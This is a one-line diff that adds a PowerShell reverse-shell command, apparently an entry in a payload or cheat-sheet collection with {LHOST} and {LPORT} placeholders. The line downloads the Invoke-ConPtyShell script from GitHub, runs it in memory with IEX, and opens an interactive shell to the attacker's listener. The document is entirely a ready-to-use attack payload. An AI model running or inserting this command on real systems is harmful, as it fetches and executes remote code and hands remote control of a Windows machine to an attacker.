@@ -1,0 +1,1 @@
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell -RemoteIp {LHOST} -RemotePort {LPORT} -Rows 50 -Cols 220
